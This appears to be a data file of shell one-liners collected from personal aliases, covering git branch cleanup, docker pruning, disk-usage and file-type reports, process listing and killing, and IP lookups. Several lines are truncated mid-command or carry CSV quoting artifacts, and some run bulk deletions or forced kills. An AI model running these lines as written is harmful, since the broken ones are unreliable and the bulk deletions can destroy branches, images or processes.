git log --pretty=format: --name-only | grep -ve '^$' | sort | uniq -c | sort -r | less | head -30
git log --name-status | grep -E '^M[[:blank:]]' | cut -d' ' -f 2 | sort | uniq -c | sort -rn | head -20
git log --graph --pretty=format:'%C(yellow)%h%Creset - %C(red)%d%Creset %C(green)%s %C(yellow)||%Creset %C(red)%ar %C(yellow)||%Creset %C(magenta)%cd %C(yellow)||%Creset %C(cyan)%an'
git log --author '$GIT_USERNAME' --no-merges --after={10.hour.ago} | cat | grep -v '^commit ' | grep -v '^Author: ' | grep -v '^Date: ' | grep -v '^$' | tail -r
git fsck --lost-found | grep '^dangling commit' | cut -d ' ' -f 3- | xargs git show -s --format='%ct %H' | sort -nr | cut -d ' ' -f 2 | xargs git show --stat
git for-each-ref --sort=-committerdate refs/heads --format='%(refname:short)|%(committerdate:short)|%(authorname)|%(objectname:short)|%(contents:subject)' | column -t -s'|'
git for-each-ref --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:reset)%(subject)|%(color:magenta)%(authorname)%(color:reset)'|column -ts'|'| head -n 20
git for-each-ref --sort=-committerdate refs/heads --format='%(HEAD)%(color:yellow)%(refname:short)|%(color:bold green)%(committerdate:relative)|%(color:blue)%(subject)|%(color:magenta)%(authorname)%(color:reset)'|column -ts'|'|head -n10
git for-each-ref --format='%(refname:short)|%(committerdate:short) (%(committerdate:relative))|%(authorname)|%(objectname:short)|%(contents:subject)' --sort=committerdate refs/remotes/ | column -t -s '|'
git for-each-ref --format='%(refname:short)|%(committerdate:short) (%(committerdate:relative))|%(authorname)|%(objectname:short)|%(contents:subject)' --sort=committerdate refs/heads/ | column -t -s '|'
git for-each-ref --color --sort='-refname' --format='%(HEAD) (%(color:green)%(committerdate:relative)%(color:reset)) | %(color:yellow)%(refname:short)%(color:reset) | %(color:red)%(objectname:short)%(color:reset) | %(contents:subject) | %(authorname)' | column -t -s '|'
git for-each-ref --color --sort='-committerdate' refs/heads/ --format='%(HEAD) (%(color:green)%(committerdate:relative)%(color:reset)) | %(color:yellow)%(refname:short)%(color:reset) | %(color:red)%(objectname:short)%(color:reset) | %(contents:subject) | %(authorname)' | column -t -s '|'
git fetch; git remote prune origin; git branch -r --merged origin/master | sed 's/ //g' | grep -v '*' | grep -v 'master$' | grep origin | sed 's/origin\///g' | xargs git push origin --delete
git diff | egrep -i '(IO\.inspect)|(abort)|(debug)|(alert)|(console.log)|(TODO)'
git diff --summary | grep --color 'mode change 100755 => 100644' | cut -d' ' -f7- | xargs chmod +x && git diff --summary | grep --color 'mode change 100644 => 100755' | cut -d' ' -f7- | xargs chmod -x
git diff --name-only master.. db/migrate | tail -r | cut -d'/' -f3- | cut -d'_' -f1 | xargs -n1 -I {} env \$(cat .env | xargs) bin/rails db:migrate:down VERSION={} ; env \$(cat .env | xargs) bin/rails db:migrate
git diff --name-only HEAD^ | grep -v 'BUILD.bzl' | paste -sd '+' - | xargs $BZL_COMMAND query -k --output=package | sort -u | tr '\n' ' ' | xargs $BZL_COMMAND gen
git checkout \$(git branch -a | sed 's/remotes\/origin\///' | grep -v '\*|HEAD' | sort |uniq | fzf --select-1)
git checkout -b \`sp | tail -2 | grep '#' | sed 's/^ //' | sed 's/[^A-Za-z0-9 ]//g' | sed 's/ /-/g' | cut -d
git branch -r | sed -n -e 's/origin\///p' | awk '{ print $1 }' | cat < <(git rev-parse --abbrev-ref HEAD) | egrep -v -f /dev/fd/0 <(git branch) | awk '{print $1}' | xargs git branch -D
git branch -r --merged | grep -v -E '\*|master|develop' | grep origin | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch -r --merged | egrep -v '(^\*|master|develop|release)' | sed 's/origin\///' | xargs -n 1 git push --delete origin
git branch -a --merged |grep feature | sed 's|remotes/origin/||' |xargs git push origin --delete
git branch --no-color | command grep -vE '^(\+|\*|\s*(master|develop|dev)\s*$)' | command xargs -n 1 git branch -D
git branch --merged|egrep -v '\\*|develop|master|design|design/design-mock'|xargs git branch -d
git branch --merged | egrep -v '(^\*|master|dev|develop|staging)' | xargs git branch -d
gco \$(git branch -a | sed -E 's/remotes\/([a-zA-Z-]*\/)//' | rg -v '\*|HEAD' | sort |uniq | fzf --select-1)
gbr --remotes --merged origin/master|grep origin|grep -v 'origin/HEAD'|grep -v 'origin/master'|sed -e 's/origin\//:/'|awk '{ print $1}'|xargs git push origin
g ls-files | xargs basename | grep '\.' | awk -F'.' '{ print \$(NF) }' | sort | uniq -c | sort -rn
freshclam && clamscan --infected --exclude-dir='^/dev/|^/Volumes/' --exclude='\.vmdk$|\.vdi$|\.vmwarevm$|\.vmem$' -r / | egrep 'FOUND$' | tee ~/Desktop/clamscan.log
for host in \$(qstat -f -s r | grep -v scalemp | grep -v verari | grep d\$ | awk '{print \$1}' | awk -F@ '{print \$2}' | awk -F. '{print \$1}'); do read -p \
find ./ -maxdepth 1 -type d -print0 | xargs -0 du --max-depth=1 | sort -n | tail -n 50 | tail -n +1 | cut -f2 | xargs -I{} du -sh {}
find . -type f | sed -e 's/.*\.//' | sed -e 's/.*\///' | sort | uniq -c | sort -rn | head -30
find . -type f | grep -v '.git' | sed -e 's/.*\.//' | sed -e 's/.*\///' | sort | uniq -c | sort -rn
find . -type f | fzf --preview '(highlight -O ansi -l {} 2> /dev/null || cat {} || tree -C {}) 2> /dev/null | head -200'
find . -type f -print0 | xargs -0 du | sort -n | tail -30 | cut -f2 | xargs -I{} du -sh {} && echo total: $(du -sh . | awk '{print $1}')
find . -type f -not -path './.git/*' | /bin/sed -n 's/\(..*\.\)\?//p' | /bin/sed -r 's/(.*)/\L\1/' | /bin/sed -n 's/\(..*\/.*\)\?//p' | sort | uniq -c | sort -n -r
find . -type f -not -iwholename '*/.git/*' | sed -e 's/^.*\///' | grep '\.' | sed -e 's/^.*\.//' | sort | uniq -c | sort -nr
find . -type d -print0 | xargs -0 du | sort -rn | uniq | head -10 | cut -f2 | xargs -I{} du -sh {}
find . -regex '.*\.\(txt\|mk\|sh\|flags\|cmds\|Makefile\)$' -a ! -name '*.git' | xargs grep
find . -print | grep -v '\/node_modules' | grep -v '\/\.[^/]' | sed -e 's;[^/]*/;|___;g;s;___|; |;g'
find . -print | grep -v '.git' | sort | sed 's;[^/]*/;|-- ;g;s;-- |; |;g'
find . -name '*.js' -o -name '*.hbs' | grep -v tmp | grep -v test | grep -v mock | grep -v node_modules |grep -v dist | grep -v bower_components >cscope.files
find -regex '.*\.\(C\|H\|c\|h\|cpp\|hpp\)$' | xargs egrep --line-number
find -L . ! -path '*/.git/*' -type f -iname '*.*' | rev | cut -d . -f1 | rev | sort | uniq -ic | sort -rn
find -L -regex '.*\.\(C\|H\|c\|h\|cpp\|hpp\)$' -not -regex '.*git.*' | xargs egrep --line-number
file /proc/\$(ps aux | grep conta | grep flash | tr -s ' ' | cut -d ' ' -f 2)/fd/* | grep deleted | cut -d ':' -f 1
export SHELL=$AMIGRAVE/bin/shell; tmux attach || tmux || screen -rx || screen
explorer \`git remote -v | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/git@/http:\/\//' -e's/\.git$//' | sed -E 's/(\/\/[^:]*):/\1\//'\`
env | grep --color=always '^[^=]*'| sed 's/=/|/' | sort | column -ts\|
echo; echo 🌕 icanhazip.com; curl https://icanhazip.com; echo; echo 🌕 api6.ipify.org; curl https://api6.ipify.org; echo; echo; echo 🌕 iplist.cc; curl https://iplist.cc/api | json; echo; echo 🌕 ipvigilante.com; curl https://ipvigilante.com/json/full | json '.data'; echo; echo 🌕 ifconfig.co; curl https://ifconfig.co/json | json '. |= del(.user_agent)'; echo; echo 🌕 ipinfo.io; curl https://ipinfo.io | json '. |= del(.readme)'
echo ps -ef | grep -v 'UID\|bash\|ps\|java' | awk '{print $2}' | while read arq; do kill
echo https://github.com/\$(git remote -v | head -1 | perl -p -e 's|.*:([^ ]+)(.git)?.*|\1|' | sed 's/\.git$//')/compare/\$(git current-branch)
echo https://bitbucket.org/\$(git remote -v | head -1 | perl -p -e 's|.*:([^ ]+).*|\1|' | sed 's/\.git$//')/pull-requests/new?source=\$(git current-branch)
echo find source files; find ./ -regex '.*\.\(cpp\|c\|cxx\|cc\|h\|hpp\|hxx\)' > cscope.files; echo build cscope; cscope -b; echo done
echo 'running pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip3 install -U'; pip3 list --outdated --format=freeze | grep -v '^\-e' | cut -d = -f 1 | xargs -n1 sudo pip3 install -U
du ~/Music/iTunes/iTunes\ Media/Podcasts | rev | sed -E s/\([^0-9]{1}\)\([0-9]{4}\)$/\\1\\2\ \ \ / | sed -E s/\([^0-9]{1}\)\([0-9]{5}\)$/\\1\\2\ \ / | sed -E s/\([^0-9]{1}\)\([0-9]{6}\)$/\\1\\2\ / | rev | sort
du -h --max-depth=1|sort -r -n -k 1 | grep M --color=auto > /tmp/show_an_sort_dir.tmp ; du -h --max-depth=1|sort -r -n -k 1| grep K --color=auto >> /tmp/show_an_sort_dir.tmp ; du -h --max-depth=1|sort -r -n -k 1| grep 0 --color=auto >> /tmp/show_an_sort_dir.tmp;cat /tmp/show_an_sort_dir.tmp
du -h --max-depth=1|sort -hr -n -k 1 | grep M --color=auto > /tmp/show_an_sort_dir.tmp ; du -h --max-depth=1|sort -r -n -k 1| grep K --color=auto >> /tmp/show_an_sort_dir.tmp ; du -h --max-depth=1|sort -r -n -k 1| grep 0 --color=auto >> /tmp/show_an_sort_dir.tmp;cat /tmp/show_an_sort_dir.tmp
du -cms -- err.txt generated.file succ.txt . .. | sort -rn | head || du -cms -- err.txt generated.file succ.txt | sort -rn | head
drma 2>/dev/null || sudo drma; dirma 2>/dev/null || sudo dirma; docker system prune --all || sudo docker system prune --all"
dockerstopc || dockercleanc || dockercleani || dockercleanv
docker ps -a | sed '1 d' | awk '{print $1}' | xargs -L1 docker rm docker images -a | sed '1 d' | awk '{print $3}' | xargs -L1 docker rmi -f
docker ps -a | grep -v 'pgsql\|CONTAINER\|attach' | awk '{print \$1}' | xargs docker stop -t 0 | xargs docker rm
docker images | grep '<none>' | cut -c43- | rev | cut -c35- | rev | xargs docker rmi
docker images | cut -f1 -d ' ' | grep -v REPO | xargs -n1 docker pull && docker images | grep none | awk '{print $3}' | xargs -n1 docker rmi
docker images -a |grep 'dev\|none\|test-vp\|peer[0-9]-' |awk '{print \$3}' |xargs -ti docker rmi -f {}
dmesg | egrep 'error|fail|bug|rtl8|r8|wlan'
df | egrep Dispo && df -Th | egrep ‘^[/]|^[[:blank:]]|tmp$' |egrep ‘[^[:blank:]]*%|VG_tout-.*$'
df -hP | egrep '^/dev/| /(tmp|run|dev/shm)' | egrep -v /var/lib/snapd/snap | egrep -v 'tmpfs'
date -d @$(xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s) +'%d %b %r'
date -d @$(xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s) +'%d %b %R'
date -d @$(xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s) +'%F %X'
date -d @$(xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s) +'%F %R'
date -d @$(xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s) +'%D %r'
date -d @$(xsel -b -o | grep --color=no -oE '15[0-9]{8}' || xsel -o | grep --color=no -oE '15[0-9]{8}' || date +%s) +%X
cvs status . 2> /dev/null | grep 'Sticky Tag' | sort | uniq | sed 's/.*Sticky Tag:[ \t]*//g;s/(branch: [^)]*)//' | sort | uniq
curl -s ipinfo.io | grep -oE '((1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])\.){3}(1?[0-9][0-9]?|2[0-4][0-9]|25[0-5])' | head -1
curl -s https://www.cwb.gov.tw/V7/marine/sea_condition/cht/tables/C6AH2.html | w3m -T text/html -dump | head -n 37; read -n 1 -s -r -p 'Press any key to continue...'; echo; curl -s https://www.cwb.gov.tw/V7/marine/sea_condition/cht/tables/46694A.html | w3m -T text/html -dump | head -n 37; read -n 1 -s -r -p 'Press any key to continue...'; echo; curl -s https://www.cwb.gov.tw/V7/marine/sea_condition/cht/tables/46708A.html | w3m -T text/html -dump | head -n 37;
curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | sed 's|^tcp://||' | sed -r 's#(.*):(.*)#\2#'
curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url' | sed 's|^tcp://||' | sed -r 's#(.*):(.*)#\1#'
curl -s 'http://www.vpnbook.com' | grep 'Password: \(\w\+\)<' | tail -n 1 | cut -f3 -d '<' | cut -f2 -d ' ' | tr -d '\n' | pbcopy
curl -fsS https://api.github.com/repos/hashicorp/consul/tags | jq -re '.[].name' | sed 's/^v\(.*\)$/\1/g' | sort -Vr | egrep -v '(beta|rc)' | head -1
clear && elinks -dump http://randomfunfacts.com | sed -n '/^| /p' | tr -d \| | cowsay | lolcat
chromium \`git remote -v | grep fetch | head -1 | cut -f2 | cut -d' ' -f1 | sed -e's/git@/http:\/\//' -e's/\.git$//' | sed -E 's/(\/\/[^:]*):/\1\//'\`
cd \$(git ls-files \$(git rev-parse --show-toplevel) | xargs -n1 dirname | sort | uniq | fzf-tmux || echo '.')
cd /vms 2>/dev/null ||cd /VMS 2>/dev/null ||cd /*/vms 2>/dev/null ||cd /*/VMS 2>/dev/null
cat ~/.zhistory | cut -d ';' -f 2- | awk {'print \$1'} | sort | uniq -c | sort -r | head -20
cat package.json | json scripts | json --items -a key value | sed 's/ /|/' | column -s '|' -t
cat package.json | json devDependencies | json --items -a key value | sed 's/ /|/' | column -s '|' -t
cat package.json | json dependencies | json --items -a key value | sed 's/ /|/' | column -s '|' -t
cat <(adb devices | tail -n +2 | cut -sf -1) <(adb devices | tail -n +2 | cut -sf -1| xargs -I X adb -s X shell getprop ro.build.version.release) | paste -d : - -
cat /etc/modprobe.d/wfx_core.conf | grep -v ^# | grep -v ^$ ; cat /etc/modprobe.d/wfx_wlan_sdio.conf | grep -v ^# | grep -v ^$ ; cat /etc/modprobe.d/wfx_wlan_spi.conf | grep -v ^# | grep -v ^$ ;
cat ./package.json | jq .dependencies | jq -r 'keys[]' | xargs -L 1 -I % sh -c 'rg % | wc -l | xargs echo %' | rg \
bundle check 2>&1 > /dev/null || { ((test -d vendor/cache && bundle --local --quiet) || bundle --quiet) || bundle check > /dev/null; }
bat --theme DarkNeon --color always -p ~/.bashrc | rg alias | rg -v '#' | sed 's/'\''/ /g' | sed 's/=/ =/' | cut -d ' ' -f2-15 | tr -d '\
aws s3 ls s3://tint --recursive | grep -v -E '(Bucket: |Prefix: |LastWriteTime|^$|--)' | awk 'BEGIN {total=0}{total+=\$3}END{print total/1024/1024\
adb logcat -v time | grep -E 'amffmpeg|M3uParser|M3uSession|AmlogicPlayer|amplayer' | grep '404'
ack '(TODO|todo|Todo|(?<!DE)BUG|XXX|HACK|FIX(ME)?)'
\$(ps aux | grep tmux | grep -v grep | awk '{print $2}' | xargs kill) || exit
\$(history 1 | sed 's/^[ ]//g' | cut -d' ' -f 3- | egrep '^cd ' | sort | uniq | fzf)
[ -f settings.json ] && meteor run --settings settings.json || [ -f settings-development.json ] && meteor run --settings settings-development.json || [ -f settings.development.json ] && meteor run --settings settings.development.json || meteor run
[ $(git rev-parse --show-toplevel 2>/dev/null || echo ~) = $(pwd) ] && cd $([ $(echo ~) = $(pwd) ] && echo / || echo) || cd $(git rev-parse --show-toplevel 2>/dev/null)
HISTTIMEFORMAT='' HISTCONTROL=ignoredups history | cut -c 8- | grep -v 'grep\|hf\|uniqHistory' | tac | dedupe
3621860,582363,typeless,history | tail -n 20000 | sed """"s/.* //"""" | sort | uniq -c | sort -g | tail -n 100"""
. ./setEnv.sh 2>/dev/null || . /vms/setEnv.sh 2>/dev/null || . /tmp/setEvn.sh 2>/dev/null || . /app/setEnv.sh 2>/dev/null
(uptime -p | sed 's/hours/horas/' | sed 's/minutes/minutos/'| sed 's/hour/Hora/' | sed 's/minute/minuto/' | sed 's/day/dia/' | sed 's/up//')
(ps aux | awk 'NR==1' && ps aux |grep -E \\\\[\|\\\\] |grep -vE grep\|sshd) |less
(ATI|AMD|Graphics|Upstream|TyMCE|AGPM|Radeon)
( [ -f README.md ] && ( markdown README.md | bcat ) ) || ( [ -f README.markdown ] && ( markdown README.markdown | bcat) ) || true
$DEV_BOX_COMMAND docker ps --format {{.Names}} | sed 's|bzl-itest_|//|' | sed 's/-/\//'| sed 's/-/:/'
$(ls /sbin/.core/busybox/wget || ls /sbin/.magisk/busybox/wget || ls /system/bin/grep || ls /system/xbin/grep) 2>/dev/null;
"{commandhistory | grep -Fx ""$(listselfdefined)"" | sort | uniq -c | sort -nr; listselfdefined | grep -Fvx ""$(commandhistory)"" | sed ""s/^.*/ 0 &/""}"
"{ sensors | tail -3| head -2 | cut -d\( -f1 | tail -4|cut -d+ -f2 | tr -d ""\n""; echo;}"
"xprop | grep ""WM_CLASS\|^WM_NAME\|^WM_WINDOW_ROLE\|^_NET_WM_WINDOW_TYPE\|location\|size"""
"xcrun simctl list | grep -v ""not found"" | grep -v ""unavailable"" | grep -v ""Unavailable"" | grep ""iPhone\|iPad"" | grep -v ""com.apple"""
"xargs -I {} bash -c ""qsub -N `echo $workdir|sed s/^[^a-zA-Z]/_/|sed s/[^a-zA-Z0-9]/_/g` -j y $workdir/qsubone.sh \""{}\""""|grep submitted >> $workdir/qsub.log; qsub -hold_jid `echo $workdir|sed s/^[^a-zA-Z]/_/|sed s/[^a-zA-Z0-9]/_/g` $workdir/qsubone.sh touch $workdir/fin|grep submitted >> $workdir/qsub.log"
"xargs -I {} bash -c ""qsub -N `echo $workdir|sed s/^[^a-zA-Z]/_/|sed s/[^a-zA-Z0-9]/_/g` -j y $workdir/qsub.sh \""{}\""""|grep submitted >> $workdir/qsub.log; qsub -hold_jid `echo $workdir|sed s/^[^a-zA-Z]/_/|sed s/[^a-zA-Z0-9]/_/g` $workdir/qsub.sh touch $workdir/fin|grep submitted >> $workdir/qsub.log"
"watch "" lsof -i -n -P | grep \""LISTEN\"" | h -ni \""27017|mongod\"" \""node\"" \""3001|9229\"" \""3000|9222\"" ""8080|9007"" "" "
"virsh list --all --title | tail -n +2 | awk '{print \$2,\$3}' | sort -k1 | sed 's/shut/off/g' | sed 's/running/on/g' | column -t"
"vim.tab $(find . -iregex ""\./\(build\|submodule\).*"" -prune -or -iregex "".*\.\(cxx\|hxx\|cpp\|hpp\|c\|h\)$"" -print)"
"vim `find . | egrep "".*(\.(h|cc|proto|js|sh)|BUILD)\$""`"
"vim -c ""setlocal nonumber | setlocal norelativenumber | AirlineToggle | set noshowmode | set laststatus=0 | set noshowcmd | highlight EndOfBuffer ctermfg=black ctermbg=black"""
"vim -N -u NONE -c ""set nocp| nn gt <C-^>|nn <C-l> :bn<CR>| nn <C-h> :bp<CR>| nn ; :|cno ; <C-e><C-u><C-h><Esc><Esc><Esc>| nnoremap q :q<Enter>"""
"upower -i /org/freedesktop/UPower/devices/battery_BAT0 | egrep ""state:|percentage:"" | ruby -ne ""puts \$_.split.map { |s| s.ljust(15)}.join"" && echo ""---"" && acpi -V | grep --color=never ^Battery"
"upower --show-info $(upower --enumerate | grep BAT) | grep --color=never -E ""state|to full|to empty|percentage"" | sed ""s/^\s*//"""
"tree -d -L 2 -I ""__pycache__|.hg|.git|.DS_Store|htmlcov|.hgcheck|src"""
"tree -a -I ""__pycache__|.hg|.git|.DS_Store|htmlcov|.hgcheck|src"" --dirsfirst"
"tree -a -I ""\.DS_Store|\.git|\.svn|node_modules|vendor|tmp|volumes"" -N -A -C"
"tree -a -I "".git|venv|.venv|*.class|__pycache__|.idea|.ipynb_checkpoints"""
"tree -a -C -I "".git|.svn|node_modules|.gradle|tmp|.sass-cache|.cache"""
"tree -I ""*.pyc|__pycache__|node_modules|htmlcov|*.o|*.obj|.git"""
"tree -Ca --noreport -I "".sass-cache|.git|node_modules|bower_components|tmp|__pycache__|.virtualenv"""
"tree -CAFa -I=""CVS|*.*.package|.svn|.git|.hg|node_modules|bower_components"" --dirsfirst"
"tree -CAFa -I ""CVS|*.*.package|.svn|.git|.hg|node_modules|bower_components"" --dirsfirst"
"tree -CAF -I ""CVS|*.*.package|.svn|.git|.hg|node_modules|bower_components"" --dirsfirst"
"top -l2 -n4 -ocpu -ncols 17 | tail +17 | grep -EC17 ""(([a-zA-Z]* *[0-9]*\.[0-9]* )|([0-9]* running)|([0-9.*%]* idle)|(: [0-9. ,]*$)|([0-9KMG ]*free))"" "
"team_repos_log=""$(mktemp)""; for repo in $(readlink $HOME/team-repos/*); do pushd $repo >> $team_repos_log; basename $repo; b=$(git branch --show-current); stashed=""""; [[ ""$(git stash list | wc -l)"" = ""$(git stash >> $team_repos_log && git stash list | wc -l)"" ]] || stashed=yes; [[ ""$b"" = ""master"" ]] || git switch master 2>1 >> $team_repos_log; "
"system_profiler SPUSBDataType | grep -v ""USB\:"" | grep -v ""USB High-Speed Bus\:"" | grep ""\(\:$\|^.*Product\|^[ ]*Vendor\|Current Avail\)"""
"svn status | grep -v tags | grep -v results.log | grep -v cscope.out| grep -v applet| grep -v ""X "" |grep -v Performing"
"svn log -q|grep ""|""|awk ""{print \$3}""|sort|uniq -c|sort -nr"
"svn log -q | grep ""|"" | awk ""{print \$3}"" | sort | uniq -c | sort -nr"
"svn diff -r`svn log --stop-on-copy | grep -P ""^r\d+"" | sort | head -n 1 | cut -d ""|"" -f 1 | sed ""s/\s//g""`:HEAD ."
"svn diff -r`svn log --stop-on-copy | grep -P ""^r\d+"" | sort | head -n 1 | cut -d ""|"" -f 1 | sed ""s/\s//g""`:HEAD . --summarize"
"sudo sed -i -re ""s|^Server|#Server|; s|^#Server = http://mirrors.ustc.edu.cn|Server = http://mirrors.ustc.edu.cn|"" /etc/pacman.d/mirrorlist"
"sudo sed -i -re ""s|^Server|#Server|; s|^#Server = http://mirrors.tuna.tsinghua.edu.cn|Server = http://mirrors.tuna.tsinghua.edu.cn|"" /etc/pacman.d/mirrorlist"
"sudo nmap -sn -PR --dns-servers ""192.168.178.1"" ""192.168.178.*"" | grep ""report for"" | sed ""s/.*for //"" | sed ""s/\.fritz\.box//"" | sed ""s/)//"" | while read f; do echo ""$f"" | awk "
"sudo lsof -iTCP -sTCP:LISTEN | tail -n +2 | sort -k 9 | awk '{ print \$1,\$9,\$10 }' | column -t | uniq | sort"
"sudo lsof -iTCP -sTCP:LISTEN -P -n | tail -n +2 | sort -k 9 | awk '{ print \$1,\$9,\$10 }' | column -t | uniq | sort"
"sudo lsof -iTCP -sTCP:ESTABLISHED | tail -n +2 | sort -k 9 | awk '{ print \$1,\$9,\$10 }' | column -t | uniq | sort"
"sudo lsof -iTCP -sTCP:ESTABLISHED -P -n | tail -n +2 | sort -k 9 | awk '{ print \$1,\$9,\$10 }' | column -t | uniq | sort"
"sudo lsof -i -n -P | grep $HTTP_SERVICES | grep LISTEN | egrep -o "":[0-9]{2,5}"" | cut -f2- -d: | sort -n | uniq"
"sudo iwlist wlan1 scan | awk -F:= '/(ESSID|Address|Channel|Frequency|Quality|Encryption)/ { print substr(\$1,1) } '"
"sudo iwlist wlan0 scan | awk -F:= '/(ESSID|Address|Channel|Frequency|Quality|Encryption)/ { print substr(\$1,1) } '"
"ssh bsd ""cat ~/dev/map/map.log"" |sed ""s/Apple.*//"" | sed ""s/Mozilla\/5.0 //"" | sed ""s/::ffff://"" | sed ""s/ like Mac OS X)//"" | sed ""s/; CPU.*OS//"" | sed ""s/(//"""
"set -- $(ls -t $(date +%H)*) && file=$1 && file=${file%.*} && rm -f *_filtered.LOG && ecat $file.LOG ""MEAS_CYCLE|\<MISC\>"" ""Incubator|Magnet|Separator|Probe|Diluter| ms "" > ""$file""_filtered.LOG && npp ""$file""_filtered.LOG"
"sed -e ""s|\s\+| |g"" -e ""s|^\s\+||g"""
"rm -vf `find | egrep ""(*~|*\.pyc|*\.pyo|\#*\#|*\.class|*_flymake\.py)""` 2>/dev/null"
"qvm-ls --raw-data name state template netvm|grep Running|cut -d""|"" -f1,3-|tr ""|"" "" ""|column -t"
"qstat -r | grep ""job-ID\|----\|njh\|jobname"" | sed 3~1""N;s/\n *Full jobname: */ /""|less"
"pwd;find . | grep -v ""\/\."" | sort | sed ""1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g"""
"pt """" err.txt generated.file succ.txt | fzf --preview ""(highlight -O ansi -l {} 2> /dev/null || cat {} || tree -C {}) 2> /dev/null | head -200"""
"ps uaxww | grep mgolden | grep bells | grep -v grep | sed -e ""s/^[^ ]* */kill /"" | sed -e ""s/ .*//"" | sh"
"ps ax | pgrep -f ""ssh -fNC (malbec|albatros|caladoc|ssug1001lx|ssug1003lx)"" | while read i; do kill -15 $i; done"
"ps aux |grep -v grep | grep -v ""^root "" | grep -v ""^nobody "" | grep -v ""^postfix "" | grep -v ""^windowse "" |sort"
"ps aux | tail +2 | grep -v root | grep -v bin | grep -v daemon | cut -f1 -d"" "" | sort -u"
"ps aux | rg ssh | rg adhoc | tr -s "" "" | cut -d "" "" -f 2 | xargs echo | xargs kill"
"ps aux | grep ""gulp\|node\|npm"" | grep -v ""atom"" | cut -d"" "" -f2 | sudo xargs kill -9"
"ps aux | grep ""gulp\|node\|npm"" | grep -v ""atom"" | awk ""{print \$2}"" | sudo xargs kill -9"
"ps -x -o %mem,pid,command=CMD |grep --color=always 'Google Chrome Helper' | sed -e 's/^ *//;s/ */ /g' | sort -n | tail -n 10 | cut -f 2 -d ' ' | xargs -n 1 kill"
"ps -fu $LOGNAME | $GREP -v bash | $GREP -v csh | $GREP -v xterm | $GREP -v rlogin | $GREP -v grep | cut -c 8-22,49-"
"ps -fe | grep ""ftpd"" | grep -v ""grep\|nobody\|root"" | cut -f 1 -d "" "" | sort"
"ps -eo pid,command | egrep '9222|9333|20058' | grep -v 'grep' | awk '{print \$1}' | xargs kill"
"ps -ef|grep -v grep |grep pmon| tr -s [:space:] | cut -d"" "" -f8 | cut -d""_"" -f3 | sort"
"ps -ef | grep mongod | tr -s "" "" "" "" | cut -d"" "" -f 3,4 | while read line; do if [[ `echo $line | cut -d "" "" -f2` -eq 1 ]]; then sudo kill -9 `echo $line | cut -d"" "" -f1`; fi; done"
"ps -ef | grep -v grep | grep -P ""ssh|vim|tmux"" || echo ""clean"""
"pip freeze -l|cut -d ""="" -f 1|sort -f|xargs pip search -v|grep ""INSTALLED:"" -B 1 -A 1|grep -i ""latest"" -B 2|grep -vE ""^\-\-"""
"pacman -Qe | pacman -Qi | grep ""Name\|Description"" | cut -d \: -f 2 | awk "" {print;} NR % 2 == 0 { print ""\n""; }"" | less"
"op list items | jq -c '.[] | {title: .overview.title, uuid: .uuid}' | peco | jq -r '.uuid' | xargs op get item | jq '.'"
"notify-send -i ""$([ $? = 0 ] && echo terminal || echo error)"" ""$([ $? = 0 ] && echo \""[completed]\"" || echo \""[FAILED]\"") $(history|tail -n1|sed -e "
"notify-send --urgency=low -i ""$([ $? = 0 ] && (echo terminal; exit 0) || (echo error; exit 1))"" ""$([ $? = 0 ] && echo Task finished || echo Something went wrong!)"" ""$(history | sed -n ""\$s/^\s*[0-9]\+\s*\(.*\)[;&|]\s*alert\$/\1/p"")"""
"nocorrect git branch -r | grep -v HEAD | while read b; do git log --color --format=""%ci _%C(magenta)%>(15)%cr %C(bold blue)%<(16)%an%Creset %C(bold cyan)$b%Creset %s"" $b | head -n 1; done | sort -r | cut -d_ -f2- | sed ""s;origin/;;g"""
"nkn_PARTIAL 2>/dev/null | grep -v ""\(\(\Use \`pm2 show <id|name>\`.*details.*app\)\|\(┬─────┬\)\|\(┴─────┴\)\|\(App name.*mode.*cpu.*mem.*watching\)\)"" | awk ""{print $0}"""
"netstat -aln | grep -iv dgram | grep -iv udp | grep -iv stream | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail -n +2"
"netstat -al | grep -iv dgram | grep -iv udp | grep -iv stream | grep -v CLOSE_WAIT | cut -c-6,21-94 | tail -n +2"
"n server.xml | xargs grep Connector | grep HTTP | grep port | grep pro | grep -v ""!"" | grep -v Define"
"mpv ""$(/bin/tree -fQP ""*.m4v\|.mkv\|*.mp3\|*.mp4"" | fzy | sed ""s/\W*//"" | sed ""s/\""//"")"" "
"mount | sed 's/ on / /' | sed 's/ type / /' | column --table --table-columns SOURCE,TARGET,TYPE,OPTIONS -o'|' | fzf --preview-window right:33%:wrap --preview 'tree -L 4 -d -C --noreport -C $(echo {} | cut -d"
"mkdir -p ~/.vim/ && /bin/rm -f ~/.vim/cscope.* && find /usr/include /usr/local/include ~/include/ $PWD |grep -E ""\.c$|\.h$|\.y$|\.l$|\.cpp$|\.cc$"" > ~/.vim/cscope.files && cd ~/.vim/ && cscope -b -q && cd -"
"megacli -PDList -aAll | egrep ""Enclosure Device ID:|Slot Number:|Inquiry Data:|Error Count:|Failure Count:|state"""
"mask_path.rb | grep ""|"" | sort | uniq -c | sort -n | awk "
"ls| egrep --color=never ""(mp3|ogg|flac|wav|m4a|wma)$"""
"lsof -i -n -P | h -ni ""27017|mongod"" ""toto"" 3000|node|3001|9229|8080"" 9222"
"lsof -i -n -P | grep $HTTP_SERVICES | grep LISTEN | egrep -o "":[0-9]{2,5}"" | cut -f2- -d: | sort -n | uniq"
